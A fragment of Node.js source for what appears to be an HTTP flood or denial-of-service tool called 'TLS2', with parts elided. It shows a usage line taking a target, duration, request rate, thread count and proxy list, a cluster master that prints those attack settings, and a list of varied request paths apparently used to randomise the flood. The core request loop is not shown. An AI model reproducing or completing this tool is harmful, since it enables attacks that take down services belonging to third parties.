...
try {
 ...
 if (process.argv.length < 7){ console.clear();
  console.log(` node TLS2 target time rate thread proxy`.bgWhite); process.exit();}
 const headers = {};
...
if (cluster.isMaster){
  ...
  console.log(`MODE: ${process.argv[1]}`.red)
  console.log(`Target: ${process.argv[2]}`.bgGreen)
  console.log(`Duration: ${process.argv[3]}`.america)
  console.log(`Threads: ${process.argv[5]}`.bgCyan)
  console.log(`RQS/S: ${process.argv[4]}`.bgYellow)
...
const pathts = [
  ...
  "/?uername=zlq&age=20",
  "/?uername=zlq&age=2",
  "?EIO=4&sid=Fo2AMo6kHgmtsWY1FYt4&transport=polling",
];
